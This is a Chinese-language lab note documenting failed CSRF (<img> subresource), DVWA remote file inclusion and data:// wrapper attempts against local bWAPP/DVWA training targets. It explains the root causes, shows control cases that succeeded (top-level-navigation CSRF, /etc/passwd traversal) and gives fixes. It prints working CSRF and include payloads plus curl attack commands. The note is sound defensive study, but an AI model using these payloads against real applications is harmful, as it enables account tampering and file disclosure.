# 未复现笔记：bWAPP CSRF 的 `<img>` 子资源形态未成立（浏览器不携带 Cookie），以及 DVWA RFI 未成立（`allow_url_include=Off`）

- **笔记编号**：N-B06（CSRF img 形态）、N-B01（DVWA RFI）、N-B02（`data://` 包装器）（Loop 3 B 档阴性归档，t5）
- **靶场**：Kali VM `dc1` 内 bWAPP `http://192.168.56.101/bWAPP/` 与 DVWA `http://192.168.56.101/dvwa/`（宿主侧）；VM 内 `http://127.0.0.1/...`
- **定性**：**未复现（阴性）** —— 三条攻击形态在本环境均未成立
- **危害等级**：**无（阴性结论）**。本篇只记录"打不出来"及其机制，**不构成漏洞报告**
- **配套阳性笔记**：
  - `security/learning/csrf/B3-CSRF-01-bWAPP真实CSRF与token对照.md`（**顶级导航形态 CSRF 成功**，3/3）
  - `security/learning/path-traversal/B1-LFI-01-DVWA文件包含路径穿越与phpfilter源码读取.md`（**LFI 成功**，5/5）

> **本篇的价值**：同一个应用里，**`<form>` 和顶级导航形态成立、`<img>` 子资源形态不成立**。不写清楚这条，下游会误以为"CSRF 已完全打通"或反过来"该应用 CSRF 免疫"，**两个结论都是错的**。

---

## 1. 概述与等级

| 编号 | 攻击形态 | 目标 | 尝试 | 结果 |
|---|---|---|---|---|
| **N-B06** | `<img src="http://victim/bWAPP/csrf_3.php?...">` **子资源** | bWAPP low | 真实 Chromium，3 形态 | ❌ **失败** —— 接收端 `cookie_sent: null`，**子资源不带 Cookie** |
| **N-B01** | `?page=http://127.0.0.1:8099/shell.txt` **RFI** | DVWA low `fi` | 3 轮 | ❌ **失败** —— 200 但**未执行**，接收端 **0 命中** |
| **N-B02** | `?page=data://text/plain;base64,...` | DVWA low `fi` | 1 轮 | ❌ **失败** —— 200 但 `executed: false` |

**对照（同环境成立的两条）**：

| 对照 | 目标 | 结果 |
|---|---|---|
| bWAPP low + **顶级导航** `location.href=...`（跨站 Origin） | `/bWAPP/csrf_3.php` | ✅ **成立**，真实改写 `secret`（3/3，已复原） |
| bWAPP low + **`<form>` 提交** | `/bWAPP/csrf_3.php` | ✅ **成立** |
| DVWA low + **本地路径穿越** `../../../../../../etc/passwd` | `/dvwa/vulnerabilities/fi/` | ✅ **成立**（5/5） |

**等级判定**：**无危害等级**（阴性）。但这三条的**信息价值高于危害价值** —— 它们划出了每条攻击链的**准确边界**。

---

## 2. 原理（三条为什么失败）

### 2.1 N-B06 · `<img>` 子资源不带 Cookie

**根因在浏览器，不在服务端。** 实测（`loop3-t4-probe9.json`）：

| 场景（从 `file://` 攻击页发起） | 接收端是否带 Cookie |
|---|---|
| **子资源**（`<img src=...>`） | **不带**（`cookie_sent: null`） |
| **顶级导航**（`location.href=...`） | **带**（`security_level=0; PHPSESSID=...; l3marker=...`） |

**关键背景**：bWAPP 的会话 cookie **完全没有 `SameSite` 属性**（`session.cookie_samesite` 无值，实测见 `loop3-t4-probe1-out.txt`）。

于是出现一个容易搞混的组合：

- **"无 SameSite" ≠ "任何跨站请求都带 Cookie"**
- 现代浏览器（Chromium 默认 `SameSite=Lax` 策略）对**无属性 cookie** 也套用 **Lax-by-default**：Lax 允许**顶级导航**（link / `location.href` / 表单 GET）携带 Cookie，但**子资源请求（img / script / css / iframe）一律不带**。

**所以**：顶级导航形态能成，`<img>` 形态不能成 —— **这一差异完全来自浏览器的 Lax 默认策略，与服务端无关**。

> **注意**：`csrf_3.php` 用 `$_REQUEST` 取参（GET/POST 都收），所以**只要 Cookie 带上了，GET 就足以改数据**。本例中 `<img>` 失败纯粹是 Cookie 没到，不是服务端挡住了 GET。**如果应用自己设了 `SameSite=Strict`，顶级导航也会被拦。**

### 2.2 N-B01 · RFI：`allow_url_include=Off`

DVWA low 的 `fi` 关卡用 `include($file)`，**但 `include()` 只在 `allow_url_include=On` 时才处理 `http://` 包装器**。

PHP **默认 `allow_url_include = Off`**（实测确认）→ 传入 `http://` URL 时：

- `include()` **不发起任何外连**
- 把 `http://127.0.0.1:8099/shell.txt` 当作**本地路径**去 `include` → 文件不存在 → PHP Warning，页面照常 200 渲染

**接收端 0 命中**就是最硬的证据：**如果真的发起了外连，接收端一定会记录到请求**。宿主侧统计 `sink_hits_total: 0`。

### 2.3 N-B02 · `data://` 包装器：同一个开关

```bash
?page=data://text/plain;base64,PD9waHAgZWNobyAnRFJBVEEtTE9PUDMtOTkwMCc7ID8+
```

`data://` 同样属于**URL 包装器**范畴，受 `allow_url_include` 约束 → **同一个开关把它一起关掉了**（实测 `executed: false`）。

---

## 3. 可复现 payload（对照用，均未生效）

### N-B06 · `<img>` 子资源形态

```html
<!-- 攻击页（file:///tmp/lo3-csrf.html），子资源形态 -->
<img src="http://192.168.56.101/bWAPP/csrf_3.php?login=bee&secret=LO3IMG&token=">
```

对照（**同一页面，顶级导航形态 —— 这条成立**）：

```html
<script>
location.href = "http://192.168.56.101/bWAPP/csrf_3.php?login=bee&secret=LO3NAV&token=";
</script>
```

### N-B01 · RFI

```bash
curl -s -b jar "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://127.0.0.1:8099/shell.txt" | head -c 200
# 接收端（127.0.0.1:8099）同步监听：预期 0 命中
```

### N-B02 · `data://`

```bash
curl -s -b jar "http://127.0.0.1/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgZWNobyAnRFJBVEEtTE9PUDMtOTkwMCc7ID8+" | head -c 200
```

---

## 4. 复现步骤与证据

| 步骤 | 动作 | 实测结果 |
|---|---|---|
| 1 | 取 `php -i` 会话相关配置 | `session.cookie_samesite` **无值**；`cookie_httponly = Off` |
| 2 | bWAPP `Set-Cookie` 头核对 | `PHPSESSID=...; path=/`（**无 SameSite / HttpOnly / Secure**） |
| 3 | 真实 Chromium 从 `file://` 攻击页发 **`<img>` 子资源** | 接收端 `cookie_sent: null` ❌ |
| 4 | 真实 Chromium 从同一页发 **顶级导航** | 接收端带 `PHPSESSID=...; security_level=0` ✅ |
| 5 | 同页发 **`<form>` 提交** | ✅ 成立 |
| 6 | DVWA RFI 3 轮，接收端在跑 | 3 轮全 200、页面正常、**接收端 0 命中**、无 `RFI` 回显 ❌ |
| 7 | `data://` 1 轮 | 200，`executed: false` ❌ |
| 8 | 宿主侧接收端最终统计 | `sink_hits_total: 0` |
| 9 | 本地路径穿越（**阳性对照**） | `../../../../../../etc/passwd` → `root:x:0:0` ✅ |

**复现率口径**：均为**固定轮次的阴性判定**（尝试 N 次、命中 0 次），**不是概率结论**。

### 4.1 原始证据（完整文件名 + sha256，**本轮独立重算**）

证据目录：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\`

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `loop3-t4-probe9.json` | **浏览器实测 SameSite 行为**：子资源 `cookie_sent: null` vs 顶级导航带 Cookie | `9bc4e52fef99c42a3a3a4779d99cb7d1dae488b86db0c5d08f10131459758ac3` |
| `loop3-t4-probe12.json` | RFI / `data://` 阴性对照 + 最终状态核查（`sink_hits_total: 0`） | `edd5d3f50418c39f53ac8acd3684138684d4107124395a19ac280762c5da6a77` |
| `loop3-t4-probe13.json` | 复现率汇总：穿越 5/5、filter 5/5、RFI 阴性 3/3 | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `loop3-t4-probe14.json` | CSRF 三形态对照（form / 顶级导航 / img） | `7bf0cdb02ac09d7815b6b1d81b430a56701aa37001638492dcd0c037427365bf` |
| `loop3-t4-probe8.json` | bWAPP CSRF token 对照（有 token 3/3 被拦） | `faebbaad38701cd97c9c0f2867fff8279b791a186015e80b268da7cff387fbc` |
| `loop3-t4-probe1-out.txt` | `php -i` 实测：`cookie_samesite` 无值、`cookie_httponly=Off`、`use_strict_mode=Off` | `f13f5e457fc897d6194576d61a73e123f9f81265054119b018a1aa67d9a0ba57` |
| `loop3-t4-probe4-out.txt` | `Set-Cookie` 头对照 | `88684edb50d063c36839fc1c8e31dc3f9ce93490db904d1ad272946a6efc1852` |
| `loop3-b0-recon4-out.txt` | `csrf_3.php` / `xxe-2.php` 源码全文 | `fc55d98a9d638c822e5d144972ccad88b8de8d52e02fa4c6f05418a768a6dad6` |
| `loop3-b0-recon3-out.txt` | `fi/source/low.php` 与 `fi/index.php` 源码全文 | `b6617c10026ba2807d2af1ecd0071414bdccb898c7dfbe471e46bc0a3204aae6` |

**引用存在性自检**：上述 9 个文件全部存在，**missing = 0**（见 §8）。

---

## 5. 修复方案 / 防护机制说明

### 5.1 CSRF：为什么"无 SameSite"仍然挡住了 `<img>`

**防护来自浏览器默认策略**（Lax-by-default），**不是应用自己做的**。这意味着：

| 应用设置 | 顶级导航跨站 | 子资源（`<img>`）跨站 |
|---|---|---|
| 无 `SameSite`（本例，Chromium 默认） | **带 Cookie** ❌ 可打 | 不带 ✅ 挡住 |
| `SameSite=Lax` | 带 Cookie ❌ 可打 | 不带 ✅ 挡住 |
| `SameSite=Strict` | **不带** ✅ 挡住 | 不带 ✅ 挡住 |

**所以 "无 SameSite" 这个缺陷只在顶级导航形态上暴露。** 正确修复方向：

1. **`SameSite=Lax` 或 `Strict`**（把"顶级导航可打"也关掉）
2. **状态变更只收 POST**（`csrf_3.php` 用 `$_REQUEST` 是隐患 —— 换成 `$_POST` 就把 GET/`$_REQUEST` 形态关掉）
3. **CSRF token**（medium/high 已有，3/3 拦得住）
4. **`Origin`/`Referer` 校验**，**缺失时拒绝**（不要"没带就放过"）
5. **敏感动作二次认证**

### 5.2 RFI：把被关掉的开关说清楚

`allow_url_include = Off` 是 PHP **默认**，**不是 DVWA 开发者做的加固**。风险在于：

- 它是**全局 ini 开关**，别的功能（远程取配置、模板）可能需要打开
- 一旦打开，`include($userInput)` **立刻变成 RCE**（不只是 LFI）

**正确修复（不能只依赖 ini）**：

1. **白名单映射**（首选）：`?page=1` 索引到固定数组
2. **`realpath()` 校验**：结果必须落在预期基目录内
3. **保持 `allow_url_include=Off` + `allow_url_fopen` 按需**
4. **`open_basedir` + 低权限 Web 进程**

---

## 6. 参考链接

- bWAPP CSRF 关卡源码：`/var/www/html/bWAPP/csrf_3.php`；DVWA FI 关卡源码：`/var/www/html/dvwa/vulnerabilities/fi/{index.php,source/low.php}`（只读取证）
- **CWE-352** — Cross-Site Request Forgery：https://cwe.mitre.org/data/definitions/352.html
- **CWE-1275** — Sensitive Cookie with Improper SameSite Attribute：https://cwe.mitre.org/data/definitions/1275.html
- **CWE-98** — Improper Control of Filename for Include/Require：https://cwe.mitre.org/data/definitions/98.html
- **CWE-73** — External Control of File Name or Path：https://cwe.mitre.org/data/definitions/73.html
- PHP `allow_url_include`（**默认 Off**）：https://www.php.net/manual/en/ini.core.php#ini.allow-url-include
- MDN `Set-Cookie` 的 `SameSite`（含 Lax-by-default 演进）：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- OWASP CSRF Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP Testing Guide — WSTG-CLNT / WSTG-LFI：https://owasp.org/www-project-web-security-testing-guide/

---

## 7. 学习要点

1. **"CSRF 成立"要精确到形态**。`<form>` ✅、顶级导航 ✅、`<img>` ❌ —— 三种形态在本环境结果不同，**只报"CSRF 成立"而不写形态，等于给了下游一个会被推翻的结论**。

2. **无 `SameSite` ≠ 所有跨站请求都带 Cookie**。现代 Chromium 对无属性 cookie 套用 **Lax-by-default**，子资源一律不带。**这是浏览器兜底，不是应用防护** —— 不能因为"`<img>` 没打中"就认为该应用 CSRF 防护到位。

3. **失败要归因到层**。本例 `<img>` 失败的根因是**浏览器策略**，不是服务端拒了 GET；RFI 失败的根因是**PHP 运行时默认值**，不是 WAF。**归因错了，修复建议就会开错药**。

4. **"接收端 0 命中"是最硬的阴性证据**。RFI 那条：`include()` 若真的外连，接收端必然记录到请求；0 命中 = 根本没外连。**比看页面报错信息可靠得多**。

5. **同名开关会一并关掉多条链**。`allow_url_include=Off` 同时干掉了 `http://` 和 `data://` —— 测出 `data://` 失败时要去查根因，不要以为"还有别的漏洞"。

6. **阴性必须配阳性对照**。本篇每条阴性旁边都列了同环境成立的对照（LFI 5/5、顶级导航 CSRF 3/3），**证明是环境边界而非测试方法问题**。

7. **复现率口径**：阴性是"尝试 N 次、命中 0 次"的**固定轮次判定**，不是概率，**不要写成百分比命中率，更不要写 100%**。

---

## 8. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe9.json','loop3-t4-probe12.json','loop3-t4-probe13.json',
          'loop3-t4-probe14.json','loop3-t4-probe8.json','loop3-t4-probe1-out.txt',
          'loop3-t4-probe4-out.txt','loop3-b0-recon4-out.txt','loop3-b0-recon3-out.txt')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=9  missing=0`
